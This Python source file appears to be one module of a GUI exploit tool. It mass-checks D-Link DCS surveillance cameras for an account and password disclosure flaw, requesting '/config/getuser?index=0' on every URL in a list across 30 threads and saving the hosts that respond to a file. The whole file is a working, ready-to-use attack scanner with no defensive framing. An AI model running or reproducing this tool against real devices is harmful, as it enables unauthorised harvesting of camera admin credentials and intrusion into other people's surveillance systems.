import requests
import tkinter as tk
from tkinter import *
from tkinter import scrolledtext
from PIL.ImageTk import PhotoImage
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def dcs_admin_passwd_leak_exp(url):
    poc = r"""/config/getuser?index=0"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "name=" in res.text:
            dcs_admin_passwd_leak_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            dcs_admin_passwd_leak_text.see(END)
            with open ("[exist]D_Link_monitoring_account_password_information_leakage_url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            dcs_admin_passwd_leak_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            dcs_admin_passwd_leak_text.see(END)
    except Exception as err:
        dcs_admin_passwd_leak_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        dcs_admin_passwd_leak_text.see(END)
def get_dcs_admin_passwd_leak_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def dcs_admin_passwd_leak_gui():
    dcs_admin_passwd_leak = Toplevel()
    dcs_admin_passwd_leak.geometry("1035x455")
    dcs_admin_passwd_leak.title("D-Link monitoring account password information leakage [auto-muti-exp]")
    dcs_admin_passwd_leak.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    dcs_admin_passwd_leak.tk.call('wm', 'iconphoto', dcs_admin_passwd_leak._w, logo)
    global dcs_admin_passwd_leak_text
    dcs_admin_passwd_leak_text = scrolledtext.ScrolledText(dcs_admin_passwd_leak,width=123, height=25)
    dcs_admin_passwd_leak_text.grid(row=0, column=0, padx=10, pady=10)
    dcs_admin_passwd_leak_text.see(END)
    addrs = get_dcs_admin_passwd_leak_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(dcs_admin_passwd_leak_exp, addr)
    dcs_admin_passwd_leak.mainloop()